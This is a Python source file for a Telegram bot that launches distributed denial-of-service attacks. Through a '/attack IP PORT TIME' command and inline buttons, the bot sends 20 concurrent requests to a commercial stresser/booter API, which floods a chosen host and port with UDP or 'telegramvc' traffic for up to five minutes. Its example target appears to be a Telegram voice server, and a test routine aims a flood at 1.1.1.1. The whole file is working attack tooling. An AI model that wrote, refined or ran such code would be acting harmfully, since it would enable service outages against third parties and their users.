# app.py - API Only with Better Error Handling
import os
import logging
import asyncio
import threading
import aiohttp
import time
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== API ATTACK WITH BETTER HANDLING =====
async def api_attack(target, port, duration, attack_id):
    """Send attack via API with detailed response"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    # Try both methods
    methods = ["udp", "telegramvc"]
    results = []
    
    for method in methods:
        params = {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": method
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }
        
        try:
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                async with session.get(url, params=params, headers=headers) as response:
                    elapsed = time.time() - start_time
                    result_text = await response.text()
                    
                    logger.info(f"Attack {attack_id} - Method {method}: Status {response.status}, Time: {elapsed:.2f}s")
                    logger.info(f"Response: {result_text[:200]}")
                    
                    if response.status == 200:
                        return {
                            "success": True,
                            "attack_id": attack_id,
                            "method": method,
                            "status": response.status,
                            "elapsed": f"{elapsed:.2f}s",
                            "response": result_text[:200] if result_text else "Success"
                        }
                    else:
                        results.append({
                            "method": method,
                            "status": response.status,
                            "response": result_text[:100]
                        })
                        
        except asyncio.TimeoutError:
            logger.error(f"Attack {attack_id} - Method {method}: Timeout")
            results.append({"method": method, "error": "Timeout"})
        except Exception as e:
            logger.error(f"Attack {attack_id} - Method {method}: {str(e)}")
            results.append({"method": method, "error": str(e)})
    
    # If we get here, all methods failed
    return {
        "success": False,
        "attack_id": attack_id,
        "method": "failed",
        "results": results,
        "error": "All methods failed"
    }

# ===== 20 CONCURRENT API ATTACKS =====
async def start_20_api_attacks(target, port, duration):
    """Launch 20 concurrent API attacks"""
    logger.info(f"🔥 Starting 20 concurrent API attacks on {target}:{port} for {duration}s")
    logger.info(f"🔑 API Key: {API_KEY[:10]}...")
    
    # Create 20 attack tasks
    tasks = []
    for i in range(1, 21):
        task = api_attack(target, port, duration, i)
        tasks.append(task)
    
    # Run all 20 attacks concurrently
    results = await asyncio.gather(*tasks)
    
    # Count successes
    success_count = sum(1 for r in results if r.get('success', False))
    
    # Collect detailed results
    detailed_results = []
    for r in results:
        if r.get('success'):
            detailed_results.append(f"✅ Attack {r['attack_id']}: {r['method']} - {r['status']} ({r['elapsed']})")
        else:
            error_msg = r.get('error', 'Unknown error')
            detailed_results.append(f"❌ Attack {r.get('attack_id', 'N/A')}: {error_msg}")
    
    logger.info(f"✅ API Attacks complete: {success_count}/20 successful")
    
    return {
        "success": success_count > 0,
        "total_attacks": len(results),
        "successful": success_count,
        "failed": len(results) - success_count,
        "results": results,
        "detailed_results": detailed_results[:10],  # First 10 results
        "target": target,
        "port": port,
        "duration": duration
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("🔬 TEST API", callback_data="test_api")])
    
    await update.message.reply_text(
        "⚡ *API ATTACK BOT*\n\n"
        "🔥 20 Concurrent API Attacks\n"
        "💪 API Powered\n\n"
        "Send: `/attack IP PORT TIME`\n"
        "Example: `/attack 91.108.13.37 32001 60`\n\n"
        "⏱️ Time: 60-300 seconds",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ Usage: `/attack IP PORT TIME`\n"
            "Example: `/attack 91.108.13.37 32001 60`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *API ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n"
            f"🔑 API: `{API_KEY[:10]}...`\n\n"
            f"⏳ Sending 20 API attacks...",
            parse_mode='Markdown'
        )
        
        result = await start_20_api_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *API ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"❌ Failed: `{result['failed']}`\n"
                f"⚡ Status: ✅ SUCCESS\n\n"
                f"📊 *Results:*\n"
            )
            
            for detail in result['detailed_results']:
                response_text += f"{detail}\n"
            
            if len(result['results']) > 10:
                response_text += f"... and {len(result['results']) - 10} more\n"
        else:
            # Show detailed failure
            response_text = (
                f"❌ *API ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Status: ❌ FAILED\n\n"
                f"📊 *Error Details:*\n"
            )
            
            for detail in result['detailed_results'][:5]:
                response_text += f"{detail}\n"
            
            response_text += f"\n💡 Check if API key is valid or API is reachable."
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except ValueError:
        await update.message.reply_text("❌ Invalid port or time! Use numbers.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💥 *API ATTACK*\n\n"
        "Send: `IP PORT TIME`\n"
        "Example: `91.108.13.37 32001 60`\n\n"
        "⏱️ Time: 60-300 seconds\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *API ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n\n"
            f"⏳ Sending API attacks...",
            parse_mode='Markdown'
        )
        
        result = await start_20_api_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *API ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"⚡ Status: ✅ SUCCESS"
            )
        else:
            response_text = (
                f"❌ *API ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Status: ❌ FAILED\n\n"
                f"Check API connection or key."
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def test_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    await query.edit_message_text("🔬 Testing API connection...\n\n⏳ Sending test request...")
    
    # Test with both methods
    test_results = []
    
    for method in ["udp", "telegramvc"]:
        url = f"https://api.susstresser.com/panel/api/api.php?key={API_KEY}&host=1.1.1.1&port=80&time=10&method={method}"
        
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                async with session.get(url) as response:
                    elapsed = time.time() - start_time
                    text = await response.text()
                    
                    test_results.append({
                        "method": method,
                        "status": response.status,
                        "elapsed": f"{elapsed:.2f}s",
                        "response": text[:200]
                    })
        except Exception as e:
            test_results.append({
                "method": method,
                "error": str(e)
            })
    
    # Build response
    response_text = "🔬 *API TEST RESULTS*\n\n"
    response_text += f"🔑 API Key: `{API_KEY[:10]}...{API_KEY[-4:]}`\n\n"
    
    for result in test_results:
        if "error" in result:
            response_text += f"❌ {result['method'].upper()}: Error - {result['error']}\n"
        else:
            status = "✅" if result['status'] == 200 else "❌"
            response_text += f"{status} {result['method'].upper()}: {result['status']} ({result['elapsed']})\n"
            response_text += f"   Response: `{result['response'][:100]}...`\n\n"
    
    response_text += "\n" + ("✅ API is working!" if any(r.get('status') == 200 for r in test_results) else "❌ API is not responding!")
    
    await query.edit_message_text(
        response_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📊 *BOT STATUS*\n\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"🌐 Status: ONLINE\n"
        f"🔑 API: {'✅ Configured' if API_KEY else '❌ No Key'}\n\n"
        f"📌 /attack IP PORT TIME",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("🔬 TEST API", callback_data="test_api")])
    
    await query.edit_message_text(
        "⚡ *API ATTACK BOT*\n\n"
        "🔥 20 Concurrent API Attacks\n"
        "💪 API Powered\n\n"
        "Send: `/attack IP PORT TIME`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(status_callback, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(test_api_callback, pattern="^test_api$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ API ATTACK BOT")
    print("🔥 20 Concurrent API Attacks")
    print("💪 API Powered")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)